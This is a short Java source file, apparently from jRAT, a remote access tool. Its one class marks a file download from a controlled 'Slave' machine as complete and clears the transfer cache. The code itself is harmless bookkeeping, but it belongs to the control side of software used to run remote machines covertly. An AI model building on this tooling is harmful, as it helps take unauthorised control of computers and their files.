package se.jrat.client.packets.incoming;

import java.io.DataInputStream;

import se.jrat.client.Slave;
import se.jrat.common.io.FileCache;
import se.jrat.common.io.TransferData;
import se.jrat.common.io.TransferData.State;


public class Packet31CompleteServerDownload extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		TransferData data = FileCache.get(slave);

		if (data != null) {
			data.getOutputStream().close();
			TransferData dt = FileCache.get(slave);
			dt.setState(State.COMPLETED);
			FileCache.remove(slave);
		}
	}

}
